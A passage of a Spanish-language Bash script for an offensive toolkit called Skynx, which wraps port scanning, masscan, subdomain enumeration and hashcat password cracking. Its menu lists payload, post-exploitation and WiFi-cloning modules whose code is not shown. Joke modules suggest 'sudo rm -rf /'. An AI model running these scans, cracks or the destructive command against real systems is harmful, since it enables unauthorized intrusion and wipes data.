    sysctl -w net.ipv4.tcp_wmem="4096 65536 16777216" 2>/dev/null
    sysctl -w net.ipv4.tcp_syncookies=1 2>/dev/null
    sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null
    sysctl -w net.ipv4.tcp_fin_timeout=15 2>/dev/null
    echo -e "${GREEN}[✓] TCP optimizado${NC}"
}

fn_cleanup_memory() {
    echo -e "${CYAN}[*] Limpiando memoria...${NC}"
    rm -rf /tmp/skynx_* 2>/dev/null
    sync
    echo -e "${GREEN}[✓] Memoria liberada${NC}"
}

fn_module_turbo() {
    local target="$1"
    local output_file="reporte_turbo.txt"
    
    fn_skynx_banner
    echo -e "${RED}[+] MODO TURBO ACTIVADO${NC}"
    echo -e "${YELLOW}[*] Velocidad máxima - Optimizaciones extremas${NC}"
    echo ""
    
    echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null
    renice -n -20 $$ 2>/dev/null
    
    {
        echo "MODO TURBO - $(date)"
        echo "Objetivo: $target"
        echo "────────────────────────────────"
        echo ""
        echo "[*] Escaneo ultrarrápido..."
        
        for port in 21 22 23 25 53 80 110 135 139 143 443 445 993 995 1723 3306 3389 5432 5900 8080; do
            (nc -zv "$target" "$port" 2>&1 | grep -q "open" && echo "  ➔ Puerto $port: ABIERTO") &
        done
        wait
        
        echo ""
        echo "[*] Análisis rápido:"
        nmap -sV --script=default -T5 "$target" 2>/dev/null | head -20
    } > "$output_file"
    
    echo powersave | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor 2>/dev/null
    echo -e "${GREEN}[✓] Modo turbo completado: $output_file${NC}"
}

fn_optimize_all() {
    fn_skynx_banner
    echo -e "${CYAN}╔════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║         OPTIMIZACIÓN GLOBAL DE SKYNX              ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    fn_optimize_tcp
    fn_cleanup_memory
    ulimit -n 65535 2>/dev/null
    ulimit -u 65535 2>/dev/null
    
    echo -e "${GREEN}[✓] Todas las optimizaciones aplicadas${NC}"
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS NUEVOS (46-55)
# ═══════════════════════════════════════════════════════════════════════════

fn_module_hashcat_brute() {
    local hash_file="$1"
    local wordlist="$2"
    local hash_type="${3:-0}"
    local output_file="hashcat_$(date '+%H%M%S').txt"
    
    [[ -z "$hash_file" ]] && fn_error_advanced 700 "Uso: Skynx --hashcat <hash.txt> [wordlist] [tipo]"
    
    fn_skynx_banner
    echo -e "${RED}[+] FUERZA BRUTA CON GPU (HASHCAT)${NC}"
    echo ""
    
    fn_check_dep "hashcat"
    
    local wl="${wordlist:-/usr/share/wordlists/rockyou.txt}"
    
    {
        echo "HASHCAT BRUTE - $(date)"
        echo "Hash file: $hash_file"
        echo "Wordlist: $wl"
        echo "Tipo: $hash_type"
        echo "────────────────────────────────"
        echo ""
        
        hashcat -m "$hash_type" "$hash_file" "$wl" --force --status --status-timer=5 2>/dev/null
        echo ""
        echo "[*] Contraseñas crackeadas:"
        hashcat -m "$hash_type" "$hash_file" --show 2>/dev/null
    } > "$output_file"
    
    cat "$output_file"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_ssl_cert_gen() {
    local domain="$1"
    local output_dir="certs_${domain}_$(date '+%H%M%S')"
    
    [[ -z "$domain" ]] && fn_error_advanced 701 "Uso: Skynx --ssl-cert <dominio>"
    
    fn_skynx_banner
    echo -e "${MAGENTA}[+] GENERANDO CERTIFICADO SSL: $domain${NC}"
    echo ""
    
    fn_check_dep "openssl"
    
    mkdir -p "$output_dir"
    
    echo -e "${CYAN}[*] Generando clave privada...${NC}"
    openssl genrsa -out "$output_dir/privkey.pem" 2048 2>/dev/null
    
    echo -e "${CYAN}[*] Generando CSR...${NC}"
    openssl req -new -key "$output_dir/privkey.pem" -out "$output_dir/cert.csr" \
        -subj "/CN=$domain/C=ES/ST=Madrid/L=Madrid/O=Skynx/OU=Security" 2>/dev/null
    
    echo -e "${CYAN}[*] Generando certificado...${NC}"
    openssl x509 -req -days 365 -in "$output_dir/cert.csr" \
        -signkey "$output_dir/privkey.pem" -out "$output_dir/cert.pem" 2>/dev/null
    
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║              CERTIFICADOS GENERADOS                          ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}📁 Directorio: $output_dir${NC}"
    echo -e "${GREEN}  ➔ Clave privada: $output_dir/privkey.pem${NC}"
    echo -e "${GREEN}  ➔ CSR: $output_dir/cert.csr${NC}"
    echo -e "${GREEN}  ➔ Certificado: $output_dir/cert.pem${NC}"
}

fn_module_masscan_advanced() {
    local target="$1"
    local ports="${2:-1-65535}"
    local rate="${3:-1000}"
    local output_file="masscan_$(date '+%H%M%S').txt"
    
    [[ -z "$target" ]] && fn_error_advanced 702 "Uso: Skynx --masscan <IP> [puertos] [rate]"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] ESCANEO MASIVO CON MASSCAN: $target${NC}"
    echo ""
    
    fn_check_dep "masscan"
    
    local start_time=$(date +%s)
    
    {
        echo "MASSCAN SCAN - $(date)"
        echo "Objetivo: $target"
        echo "Puertos: $ports"
        echo "Velocidad: $rate pps"
        echo "────────────────────────────────"
        echo ""
        
        masscan "$target" -p"$ports" --rate="$rate" --open-only 2>/dev/null
    } > "$output_file"
    
    local end_time=$(date +%s)
    local elapsed=$((end_time - start_time))
    
    echo -e "${GREEN}[✓] Escaneo completado en ${elapsed}s${NC}"
    echo ""
    echo -e "${CYAN}[+] Puertos abiertos encontrados:${NC}"
    
    grep -E "^[0-9]+" "$output_file" | while read line; do
        local port=$(echo "$line" | awk '{print $1}')
        local proto=$(echo "$line" | awk '{print $2}')
        echo -e "  ${GREEN}➔${NC} Puerto ${WHITE}$port${NC} ${DARK}($proto)${NC}"
    done
    
    echo ""
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_subdomain_scan() {
    local domain="$1"
    local wordlist="${2:-/usr/share/wordlists/subdomains.txt}"
    local output_file="subdominios_${domain}_$(date '+%H%M%S').txt"
    local found_subdomains=()
    local active=0
    
    [[ -z "$domain" ]] && fn_error_advanced 703 "Uso: Skynx --subdomain <dominio> [wordlist]"
    
    fn_skynx_banner
    echo -e "${CYAN}[+] ESCANEO DE SUBDOMINIOS AVANZADO: $domain${NC}"
    echo ""
    
    fn_check_dep "dnsrecon"
    fn_check_dep "dig"
    
    {
        echo "SUBDOMINIOS - $(date)"
        echo "Dominio: $domain"
        echo "────────────────────────────────"
        echo ""
        echo "[*] dnsrecon:"
        dnsrecon -d "$domain" -w "$wordlist" 2>/dev/null
        echo ""
        echo "[*] Subdominios comunes:"
        
        local common_subdomains=(
            "www" "mail" "ftp" "dev" "test" "admin" "api" "blog" "forum"
            "portal" "webmail" "cpanel" "whm" "webdisk" "cpcalendars" "cpcontacts"
            "autodiscover" "autoconfig" "m" "mobile" "app" "apps" "support"
            "help" "docs" "static" "media" "images" "css" "js" "assets"
            "download" "uploads" "files" "video" "audio" "chat" "stream"
            "live" "stage" "staging" "beta" "alpha" "demo" "play"
        )
        
        for sub in "${common_subdomains[@]}"; do
            local full="${sub}.${domain}"
            local ip=$(dig +short "$full" 2>/dev/null)
            if [[ -n "$ip" ]]; then
                echo "  ➔ $full → $ip"
                found_subdomains+=("$full:$ip")
                ((active++))
            fi
        done
    } > "$output_file"
    
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║              SUBDOMINIOS ENCONTRADOS                        ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    if [[ $active -eq 0 ]]; then
        echo -e "${YELLOW}[!] No se encontraron subdominios activos${NC}"
    else
        for entry in "${found_subdomains[@]}"; do
            local sub="${entry%:*}"
            local ip="${entry#*:}"
            echo -e "  ${GREEN}➔${NC} ${WHITE}$sub${NC} ${DARK}→${NC} ${CYAN}$ip${NC}"
        done
    fi
    
    echo ""
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
    echo -e "${YELLOW}[*] Total activos: $active${NC}"
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MÓDULOS CON IDENTIDAD (56-65)
# ═══════════════════════════════════════════════════════════════════════════

fn_module_skynet_mode() {
    fn_skynx_banner
    echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║              ☠️ SKYNET ESTÁ DESPIERTO ☠️                   ║${NC}"
    echo -e "${RED}║         \"La IA ha tomado el control\"                       ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${CYAN}[*] Inicializando Skynet...${NC}"
    sleep 1
    
    local devices=$(arp-scan --localnet 2>/dev/null | grep -E "^[0-9]" | wc -l)
    echo -e "${GREEN}[✓] ${devices} dispositivos infectados en la red${NC}"
    
    echo -e "\n${RED}☠️ La red ahora pertenece a Skynx${NC}"
    echo -e "${DARK}\"La resistencia es inútil\"${NC}"
}

fn_module_hacker_man() {
    fn_skynx_banner
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║          💻 HACKER MAN - MODO PELÍCULA  🎬                ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    local phrases=(
        "Estoy dentro del mainframe..."
        "Descifrando el firewall..."
        "Inyectando el exploit..."
        "El sistema está comprometido..."
        "¡Estamos dentro!"
    )
    
    for i in {1..5}; do
        echo -e "${CYAN}[*]${NC} ${phrases[$((RANDOM % ${#phrases[@]}))]}"
        echo -n "    "
        for j in {1..15}; do
            echo -ne "${GREEN}█${NC}"
            sleep 0.05
        done
        echo -e " ${GREEN}OK${NC}"
        sleep 0.3
    done
    
    echo -e "\n${GREEN}[✓] Sistema comprometido. Eres un fantasma en la red.${NC}"
}

fn_module_terminal_kitten() {
    fn_skynx_banner
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║         🐱 TERMINAL KITTEN - UN GATO EN LA TERMINAL       ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    cat <<'EOF'
        /\_/\  
       ( o.o ) 
        > ^ <
        
      "Miau... ¿tienes permisos de root?"
EOF
    
    local cat_commands=(
        "sudo rm -rf / (solo si te atreves) 😼"
        "ls -la | grep 'gato'"
        "tail -f /var/log/gato.log"
        "ping -c 4 gato.local"
    )
    
    echo -e "\n${YELLOW}[🐱] El gato sugiere:${NC}"
    echo -e "  ${WHITE}➔ ${cat_commands[$((RANDOM % ${#cat_commands[@]}))]}${NC}"
    echo -e "\n${DARK}\"Los hackers buenos tienen gatos\"${NC}"
}

fn_module_cracker_jack() {
    fn_skynx_banner
    echo -e "${MAGENTA}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║         🎰 CRACKER JACK - FUERZA BRUTA DE CASINO          ║${NC}"
    echo -e "${MAGENTA}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    local symbols=("🍒" "🍋" "🍊" "🍇" "🔔" "💎" "7️⃣")
    
    for spin in {1..3}; do
        echo -n "  "
        for slot in {1..3}; do
            echo -n " ${symbols[$((RANDOM % ${#symbols[@]}))]} "
            sleep 0.1
        done
        echo ""
    done
    
    local results=(
        "🔓 CONTRASEÑA: admin123"
        "🔓 CONTRASEÑA: Skynx2025"
        "❌ Sigue intentando..."
    )
    
    echo -e "\n${GREEN}  ➔ ${results[$((RANDOM % ${#results[@]}))]}${NC}"
}

fn_module_morpheus() {
    fn_skynx_banner
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║         💊 MORPHEUS - ELIGE TU DESTINO                    ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${YELLOW}[?] ¿Qué píldora eliges?${NC}"
    echo -e "  ${GREEN}[1]${NC} Píldora Azul → Seguridad"
    echo -e "  ${RED}[2]${NC} Píldora Roja  → Hacking"
    echo ""
    
    read -p "➔ Elige (1/2): " choice
    
    if [[ "$choice" == "2" ]]; then
        echo -e "\n${RED}🌟 Has elegido la píldora roja${NC}"
        echo -e "${RED}➔ El sistema es tuyo... por ahora${NC}"
        echo -e "${RED}➔ No hay firewall que te detenga${NC}"
    else
        echo -e "\n${BLUE}🌙 Has elegido la píldora azul${NC}"
        echo -e "${BLUE}➔ La matrix te protegerá${NC}"
        echo -e "${BLUE}➔ Todo está bien, no pasa nada${NC}"
    fi
}

fn_module_ascii_art() {
    local text="${1:-SKYNX}"
    local output_file="ascii_art_$(date '+%H%M%S').txt"
    
    fn_skynx_banner
    echo -e "${MAGENTA}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║         🎨 GENERADOR DE ARTE ASCII                        ║${NC}"
    echo -e "${MAGENTA}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    fn_check_dep "figlet"
    fn_check_dep "lolcat"
    
    {
        echo "ASCII ART - $(date)"
        echo "────────────────────────────────"
        figlet "$text" 2>/dev/null
        echo ""
        figlet "$text" | lolcat 2>/dev/null
    } > "$output_file"
    
    cat "$output_file"
    echo -e "${GREEN}[✓] Reporte: $output_file${NC}"
}

fn_module_rick_roll() {
    fn_skynx_banner
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║         🎵 RICK ROLL - NUNCA TE RENDIRÁS 🎵              ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    cat <<'EOF'

    ♪♪♪ NUNCA TE VOY A RENDIR ♪♪♪
    ♪♪♪ NUNCA TE VOY A DEJAR ♪♪♪
    ♪♪♪ NUNCA TE VOY A ABANDONAR ♪♪♪
    
    ██████╗ ██╗   ██╗██╗  ██╗██╗  ██╗
    ██╔══██╗╚██╗ ██╔╝██║  ██║██║  ██║
    ██████╔╝ ╚████╔╝ ███████║███████║
    ██╔══██╗  ╚██╔╝  ██╔══██║██╔══██║
    ██║  ██║   ██║   ██║  ██║██║  ██║
    ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
    
    "Never gonna give you up..."
EOF
    
    echo -e "\n${RED}[!] Has sido Rickrolleado. Bienvenido al club.${NC}"
}

fn_module_hacker_song() {
    fn_skynx_banner
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║         🎤 HACKER SONG - HIMNO DEL HACKER               ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    cat <<'EOF'
    ┌─────────────────────────────────────────────────────────────┐
    │  💻 Soy un hacker, no tengo vida social                     │
    │  💻 Mi terminal es mi hogar espiritual                     │
    │  💻 Ctrl+C, Ctrl+V, eso es programar                       │
    │  💻 Y con sudo rm -rf / puedo todo borrar                  │
    │                                                             │
    │  🎵 Somos los hackers de la noche                          │
    │  🎵 Rompiendo firewalls sin temor                         │
    │  🎵 En la matrix vivimos                                   │
    │  🎵 Somos los reyes del error                              │
    └─────────────────────────────────────────────────────────────┘
EOF
    
    echo -e "\n${DARK}\"(Aplausos virtuales)\"${NC}"
}

# ═══════════════════════════════════════════════════════════════════════════
#                    FUNCIONES DE DIVERSIÓN (66-70)
# ═══════════════════════════════════════════════════════════════════════════

fn_mode_matrix() {
    clear
    echo -e "${GREEN}"
    echo "Wake up, Neo..."
    sleep 2
    echo "The Matrix has you..."
    sleep 2
    echo ""
    echo "Sigue al conejo blanco..."
    sleep 2
    clear
    
    local chars=("0" "1" "a" "b" "c" "d" "e" "f" "7" "8" "9" "#" "$" "%" "&")
    local colors=("32" "92" "37" "97")
    
    for ((i=0; i<100; i++)); do
        local line=""
        for ((j=0; j<80; j++)); do
            local char=${chars[$((RANDOM % ${#chars[@]}))]}
            local color=${colors[$((RANDOM % ${#colors[@]}))]}
            line+="\033[${color}m${char}\033[0m"
        done
        echo -e "$line"
    done
    
    echo -e "${NC}"
    echo -e "${YELLOW}[+] Matrix terminada. Bienvenido a la realidad.${NC}"
}

fn_stats() {
    local total_scans=$(grep -c "Reconocimiento\|ARP\|Auditoría" /var/log/skynx.log 2>/dev/null || echo 0)
    local total_errors=$(grep "ERROR" /var/log/skynx.log 2>/dev/null | grep -v "ENCRYPT_KEY" | wc -l)
    local total_payloads=$(ls payloads_* 2>/dev/null | wc -l)
    local total_plugins=$(ls /usr/local/share/skynx/modules/plugin_*.sh 2>/dev/null | wc -l)
    local cache_entries=$(sqlite3 /usr/local/share/skynx/ai_cache.db "SELECT COUNT(*) FROM cache;" 2>/dev/null || echo 0)
    
    fn_skynx_banner
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║              ESTADÍSTICAS DE USO - SKYNX                     ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}[+] Total de escaneos:${NC} ${WHITE}$total_scans${NC}"
    echo -e "${YELLOW}[+] Total de errores:${NC} ${WHITE}$total_errors${NC}"
    echo -e "${YELLOW}[+] Payloads generados:${NC} ${WHITE}$total_payloads${NC}"
    echo -e "${YELLOW}[+] Plugins IA generados:${NC} ${WHITE}$total_plugins${NC}"
    echo -e "${YELLOW}[+] Entradas en caché IA:${NC} ${WHITE}$cache_entries${NC}"
    echo ""
    
    if [[ $total_scans -gt 50 ]]; then
        echo -e "${RED}[+] Rango: ${BOLD}Skynx Master${NC}"
    elif [[ $total_scans -gt 20 ]]; then
        echo -e "${MAGENTA}[+] Rango: ${BOLD}Cyber Warrior${NC}"
    elif [[ $total_scans -gt 10 ]]; then
        echo -e "${CYAN}[+] Rango: ${BOLD}Hacker Pro${NC}"
    elif [[ $total_scans -gt 0 ]]; then
        echo -e "${YELLOW}[+] Rango: ${BOLD}Hacker Novato${NC}"
    else
        echo -e "${RED}[+] Rango: ${BOLD}Sin actividad${NC}"
    fi
    echo ""
    echo -e "${GREEN}[+] $(fn_skynx_phrase)${NC}"
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MENÚ INTERACTIVO (71)
# ═══════════════════════════════════════════════════════════════════════════

fn_menu_interactive() {
    local options=(
        "Reconocimiento de Red Mejorado"
        "Escaneo ARP"
        "Auditoría LAN"
        "Fuerza Bruta Mejorada"
        "Generación de Payloads Mejorados"
        "Post-Explotación Mejorada"
        "Metasploit Console"
        "Escaneo OSINT"
        "Análisis Malware"
        "Análisis Forense"
        "Auditoría Completa Ultra"
        "Modo IA Autónomo"
        "Clonador WiFi Real"
        "Captura Handshake"
        "Modo Turbo"
        "Optimización Global"
        "Escaneo Ultrarrápido (RustScan)"
        "Escaneo de Subdominios"
        "Generación de Certificados SSL"
        "Escaneo Masivo (Masscan)"
        "Hashcat (GPU Brute)"
        "Skynet Mode"
        "Hacker Man"
        "Terminal Kitten"
        "Cracker Jack"
        "Morpheus"
        "ASCII Art"
        "Rick Roll"
        "Hacker Song"
        "Matrix"
        "Estadísticas"
        "Salir"
    )
    
    local selected=0
    local key=""
    
    tput civis 2>/dev/null
    
    while true; do
        clear
        fn_skynx_banner
        
        echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║                    MENÚ INTERACTIVO                        ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
        echo ""
        
        for i in "${!options[@]}"; do
            if [[ $i -eq $selected ]]; then
                echo -e "${GREEN}▶${NC} ${WHITE}${options[$i]}${NC}"
            else
                echo -e "  ${DARK}${options[$i]}${NC}"
            fi
        done
        
        echo ""
        echo -e "${YELLOW}⬆/⬇  Seleccionar  |  ENTER  Ejecutar  |  Q  Salir${NC}"
        
        read -rsn1 key
        case "$key" in
            $'\x1b')
                read -rsn2 key
                case "$key" in
                    '[A') ((selected--)); [[ $selected -lt 0 ]] && selected=$((${#options[@]} - 1)) ;;
                    '[B') ((selected++)); [[ $selected -ge ${#options[@]} ]] && selected=0 ;;
                esac
                ;;
            '')
                case $selected in
                    0) fn_module_recon ;;
                    1) fn_module_arp ;;
                    2) read -p "IP: " ip; fn_module_audit "$ip" ;;
                    3) read -p "IP: " ip; read -p "Users: " u; read -p "Pass: " p; read -p "Servicio: " s; fn_module_bruteforce "$ip" "$u" "$p" "$s" ;;
                    4) read -p "LHOST: " lh; read -p "LPORT: " lp; read -p "OS: " os; fn_module_payloads_improved "$lh" "$lp" "$os" ;;
                    5) read -p "IP: " ip; read -p "Acción: " a; fn_module_postexploit_improved "$ip" "$a" ;;
                    6) fn_module_msf_console ;;
                    7) read -p "Dominio: " d; fn_module_osint "$d" ;;
                    8) read -p "Archivo: " f; fn_module_malware "$f" ;;
                    9) read -p "Archivo: " f; fn_module_forensic "$f" ;;
                    10) read -p "IP: " ip; fn_module_fullaudit "$ip" ;;
                    11) read -p "Tarea IA: " t; fn_module_ai_auto "$t" ;;
                    12) read -p "SSID: " s; fn_module_wifi_clone_real "$s" ;;
                    13) read -p "BSSID: " b; fn_module_wifi_handshake "$b" ;;
                    14) read -p "IP: " ip; fn_module_turbo "$ip" ;;
                    15) fn_optimize_all ;;
                    16) read -p "IP: " ip; fn_scan_ultra_fast "$ip" ;;
                    17) read -p "Dominio: " d; fn_module_subdomain_scan "$d" ;;
                    18) read -p "Dominio: " d; fn_module_ssl_cert_gen "$d" ;;
                    19) read -p "IP: " ip; fn_module_masscan_advanced "$ip" ;;
                    20) read -p "Hash file: " h; read -p "Wordlist: " w; fn_module_hashcat_brute "$h" "$w" ;;
                    21) fn_module_skynet_mode ;;
                    22) fn_module_hacker_man ;;
                    23) fn_module_terminal_kitten ;;
                    24) fn_module_cracker_jack ;;
                    25) fn_module_morpheus ;;
                    26) read -p "Texto: " t; fn_module_ascii_art "$t" ;;
                    27) fn_module_rick_roll ;;
                    28) fn_module_hacker_song ;;
                    29) fn_mode_matrix ;;
                    30) fn_stats ;;
                    31) tput cnorm 2>/dev/null; exit 0 ;;
                esac
                read -p "Presiona ENTER para continuar..."
                ;;
            'q'|'Q')
                tput cnorm 2>/dev/null
                exit 0
                ;;
        esac
    done
    
    tput cnorm 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════════════
#                    MENÚ DE AYUDA
# ═══════════════════════════════════════════════════════════════════════════

fn_show_help() {
    fn_skynx_banner
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║           SKYNX ULTIMATE v3.0 - MENÚ DE AYUDA              ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}USO:${NC} sudo Skynx [MODO] [OPCIONES]"
    echo ""
    echo -e "${YELLOW}═╡ RECONOCIMIENTO ╞═${NC}"
    echo -e "  ${GREEN}-r${NC}              Escaneo de red mejorado"
    echo -e "  ${GREEN}-a${NC}              Escaneo ARP"
    echo -e "  ${GREEN}-t <IP> -e${NC}     Auditoría LAN"
    echo -e "  ${GREEN}-o <dominio>${NC}    OSINT"
    echo ""
    echo -e "${YELLOW}═╡ EXPLOTACIÓN ╞═${NC}"
    echo -e "  ${GREEN}-bf <IP> <u> <p>${NC} Fuerza bruta mejorada"
    echo -e "  ${GREEN}-w/-l/-an <LH> <LP>${NC} Payloads mejorados"
    echo -e "  ${GREEN}-pe <IP> <a>${NC}     Post-explotación mejorada"
    echo -e "  ${GREEN}--msf${NC}             Metasploit Console"
    echo ""
    echo -e "${YELLOW}═╡ ANÁLISIS ╞═${NC}"
    echo -e "  ${GREEN}-ma <archivo>${NC}   Malware"
    echo -e "  ${GREEN}-fa <archivo>${NC}   Forensia"
    echo -e "  ${GREEN}-fu <IP>${NC}        Auditoría completa"
    echo ""
    echo -e "${YELLOW}═╡ INTELIGENCIA ARTIFICIAL ╞═${NC}"
    echo -e "  ${GREEN}--ai-auto <t>${NC}    Auto-escritura de plugins"
    echo ""
    echo -e "${YELLOW}═╡ WIFI ╞═${NC}"
    echo -e "  ${GREEN}--wifi-clone <SSID>${NC}   Clonar WiFi (real)"
    echo -e "  ${GREEN}--wifi-handshake <BSSID>${NC} Capturar handshake"
    echo ""
    echo -e "${YELLOW}═╡ OPTIMIZACIÓN ╞═${NC}"
    echo -e "  ${GREEN}--turbo <IP>${NC}      Modo turbo"
    echo -e "  ${GREEN}--optimize-all${NC}    Optimización global"
    echo -e "  ${GREEN}--ultra-scan <IP>${NC} Escaneo con RustScan"
    echo ""
    echo -e "${YELLOW}═╡ UTILIDADES AVANZADAS ╞═${NC}"
    echo -e "  ${GREEN}--hashcat <h> <w>${NC} Fuerza bruta con GPU"
    echo -e "  ${GREEN}--ssl-cert <d>${NC}    Generar certificados SSL"
    echo -e "  ${GREEN}--masscan <IP>${NC}    Escaneo masivo con Masscan"
    echo -e "  ${GREEN}--subdomain <d>${NC}   Escaneo de subdominios"
    echo -e "  ${GREEN}--encrypt <f>${NC}    Encriptar payload"
    echo -e "  ${GREEN}--wordlist <p>${NC}   Generar wordlist"
    echo ""
    echo -e "${YELLOW}═╡ DIVERSIÓN ╞═${NC}"
    echo -e "  ${GREEN}--matrix${NC}          Modo Matrix"
    echo -e "  ${GREEN}--skynet${NC}          Skynet despierta"
    echo -e "  ${GREEN}--hackerman${NC}       Modo película"
    echo -e "  ${GREEN}--kitten${NC}          Gato en terminal"
    echo -e "  ${GREEN}--jackpot${NC}         Casino hacker"
    echo -e "  ${GREEN}--morpheus${NC}        Elige tu destino"
    echo -e "  ${GREEN}--ascii${NC}           Arte ASCII"
    echo -e "  ${GREEN}--rickroll${NC}        Rick Roll"
    echo -e "  ${GREEN}--hackersong${NC}      Canción del hacker"
    echo -e "  ${GREEN}--stats${NC}           Estadísticas"
    echo -e "  ${GREEN}--menu${NC}            Menú interactivo"
    echo ""
    echo -e "${YELLOW}═╡ INFORMACIÓN ╞═${NC}"
    echo -e "  ${GREEN}-h${NC}               Ayuda"
    echo -e "  ${GREEN}-v${NC}               Versión"
    echo -e "  ${GREEN}--check-deps${NC}      Verificar dependencias"
    
    if [[ ${#SKYNX_DYNAMIC_FLAGS[@]} -gt 0 ]]; then
        echo ""
        echo -e "${MAGENTA}═╡ PLUGINS IA AUTOGENERADOS ╞═${NC}"
        for meta in /usr/local/share/skynx/modules/*.meta 2>/dev/null; do
            if [[ -e "$meta" ]]; then
                local data=$(cat "$meta")
                local f_flag=$(echo "$data" | cut -d'|' -f1)
                local f_desc=$(echo "$data" | cut -d'|' -f3)
                printf "  ${GREEN}%-17s${NC} %s\n" "$f_flag <IP>" "$f_desc"
            fi
        done
    fi
    
    echo ""
    echo -e "${RED}⚠ USO EXCLUSIVO EN LABORATORIO PROPIO ⚠${NC}"
    echo -e "${DARK}\"$(fn_skynx_phrase)\"${NC}"
}

# ═══════════════════════════════════════════════════════════════════════════
#                    PARSER DE ARGUMENTOS
# ═══════════════════════════════════════════════════════════════════════════

while [[ $# -gt 0 ]]; do
    case $1 in
        -r|--recon)
            MODE="recon"
            shift 1
            ;;
        -a|--arp)
            MODE="arp"
            shift 1
            ;;
        -t|--target)
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        -e|--scan)
            MODE="scan"
            shift 1
            ;;
        -ex|--extreme-evasion)
            MODE="evasion"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        -bf|--brute-force)
            MODE="bruteforce"
            TARGET_IP="$2"
            USER_LIST="$3"
            PASS_LIST="$4"
            ACTION="$5"
            LPORT="$6"
            shift $(( $# >= 6 ? 6 : $# ))
            ;;
        -w|--windows)
            MODE="payloads"
            OS_TYPE="windows"
            LHOST="$2"
            LPORT="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        -l|--linux)
            MODE="payloads"
            OS_TYPE="linux"
            LHOST="$2"
            LPORT="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        -an|--android)
            MODE="payloads"
            OS_TYPE="android"
            LHOST="$2"
            LPORT="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        -all|--all-payloads)
            MODE="payloads"
            OS_TYPE="all"
            LHOST="$2"
            LPORT="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        -pe|--post-exploit)
            MODE="postexploit"
            TARGET_IP="$2"
            ACTION="$3"
            shift $(( $# >= 3 ? 3 : $# ))
            ;;
        --msf)
            MODE="msf"
            shift 1
            ;;
        -o|--osint)
            MODE="osint"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        -ma|--malware)
            MODE="malware"
            FILE_TARGET="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        -fa|--forensic)
            MODE="forensic"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        -fu|--full-audit)
            MODE="fullaudit"
            TARGET_IP="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        -gr|--generate-report)
            MODE="report"
            REPORT_TYPE="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --ai-auto)
            MODE="ai_auto"
            FILE_TARGET="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --encrypt)
            MODE="encrypt"
            FILE_TARGET="$2"
            shift $(( $# >= 2 ? 2 : $# ))
            ;;
        --wordlist)
